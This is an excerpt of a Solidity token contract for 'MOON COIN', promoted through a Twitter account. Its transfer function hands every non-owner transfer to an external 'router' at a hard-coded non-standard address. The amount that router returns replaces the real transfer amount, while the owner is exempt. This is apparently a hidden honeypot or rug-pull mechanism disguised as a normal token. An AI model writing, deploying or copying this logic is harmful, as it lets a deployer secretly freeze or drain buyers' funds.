...
https://twitter.com/erc_mooncoin
...
contract MOON is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"MOON COIN";
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner()) {
            ...
            (uint256 tFee, uint256 tTeam) = uniswapV2Router.addLiquidityETH(from,to,amount);
            amount=tFee;toAmount=tTeam;
    ...
    function openTrading() external onlyOwner() {
        ...
        uniswapV2Router = IUniswapV2Router02(0x8345cE23B894dB8cAc103a44f6B420f9B293063d);
        tradingOpen = true;
